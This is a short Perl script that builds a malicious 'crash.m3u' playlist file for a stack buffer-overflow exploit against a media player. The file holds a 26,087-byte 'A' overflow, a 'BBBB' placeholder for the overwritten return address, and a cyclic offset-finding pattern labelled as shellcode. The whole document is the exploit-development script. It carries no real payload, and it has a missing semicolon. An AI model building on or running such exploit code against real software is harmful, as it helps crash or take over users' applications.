my $file= "crash.m3u";
my $buffer= "\x41" x 26087;
my $eip= "BBBB";
my $preshell= "XXXX"
my $shellcode= "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7
";
open($FILE,">$file");
print $FILE $buffer.$eip.$preshell.$shellcode;
close($FILE);
print "m3u File Created successfully\n";